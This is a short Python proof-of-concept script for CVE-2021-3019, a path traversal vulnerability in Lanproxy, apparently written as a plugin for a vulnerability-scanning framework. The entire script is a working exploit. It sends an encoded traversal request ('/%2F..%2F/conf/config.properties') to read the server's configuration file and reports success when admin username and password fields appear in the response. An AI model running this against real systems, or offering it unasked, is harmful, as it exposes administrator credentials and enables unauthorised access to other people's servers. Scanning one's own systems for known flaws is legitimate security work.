# title: Ffay Lanproxy 路径遍历漏洞
# cve-id: CVE-2021-3019
# author: Jgz
# "Lanproxy"

from poctools import BasicPoc
import requests


class Poc(BasicPoc):
    def __init__(self):
        super(Poc, self).__init__()
        self.name = ""
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Aoyou/biEzMm5kNDRrWTcgazFsTEFTYejkYHK-l5UHLC1JPOhy_B1sefJvAsiTZA=='}
        self.timeout = 20

    def verify(self, url: str) -> bool:
        target = url.strip("/")
        target_1 = f'{target}/%2F..%2F/conf/config.properties'
        try:
            response_1 = requests.get(target_1, headers=self.headers, timeout=self.timeout, verify=False)
            if response_1.status_code == 200 \
                    and "config.admin.username" in response_1.text \
                    and "config.admin.password" in response_1.text:
                return True
        except Exception as err:
            pass
        return False


if __name__ == '__main__':
    url = "http://127.0.0.1:8090/"
    poc = Poc()
    result = poc.run(url)
    print(f"{url} -> {result}")
